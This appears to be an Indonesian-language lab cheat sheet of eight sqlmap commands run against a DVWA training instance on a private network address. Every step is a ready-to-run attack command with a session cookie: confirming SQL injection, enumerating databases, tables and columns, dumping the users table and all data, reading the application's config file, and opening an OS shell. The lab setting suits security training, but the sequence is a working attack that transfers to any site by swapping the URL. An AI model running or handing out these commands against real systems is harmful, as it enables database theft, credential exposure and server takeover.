## 1. CEK KERENTANAN 
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" --batch
```
## 2. LIHAT SEMUA DATABASE
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" --dbs --batch
```
## 3. LIHAT SEMUA TABEL dalam Database 'dvwa'
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" -D dvwa --tables --batch
```
## 4. LIHAT KOLOM dalam Tabel 'users'
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" -D dvwa -T users --columns --batch
```
## 5. DUMP SEMUA DATA USERS (Paling Penting)
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" -D dvwa -T users --dump --batch
```
## 6. DUMP SEMUA DATA (Semua Tabel)
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" --dump --batch
```
## 7. BACA FILE CONFIG (Bukti Serius)
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" --file-read="C:\\laragon\\www\\DVWA\\config\\config.inc.php" --batch
```
## 8. DAPATKAN SHELL (Jika Privilege Cukup)
```bash
sqlmap -u "http://192.168.68.169/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=lg6qpp0devfhncssbqjohavndh" --os-shell --batch
```
